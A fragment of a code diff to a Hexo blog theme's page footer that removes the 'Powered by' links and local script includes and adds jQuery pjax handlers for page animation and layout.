-				Powered by <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a> |
-				theme <a target="_blank" rel="noopener" href="https://github.com/fireworks99/hexo-theme-PreciousJoy">PreciousJoy</a>
-			</div>
-		</div>
-
-		
-	</div>
-
-
-
-
-
-	
-	<!-- scripts list from theme config.yml -->
-	
-	<script src="/js/jquery-3.5.1.min.js"></script>
-	
-	<script src="/js/PreciousJoy.js"></script>
-	
-	<script src="/js/highlight.pack.js"></script>
-	
-	<script src="/js/jquery.fancybox.min.js"></script>
-	
-	<script src="/js/search.js"></script>
-	
-	<script src="/js/load.js"></script>
-	
-	<script src="/js/jquery.mCustomScrollbar.concat.min.js"></script>
-	
-	<script src="/js/clipboard.min.js"></script>
-	
-	
-
-	<script>hljs.initHighlightingOnLoad();</script>
-
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
 </body>
 </html>
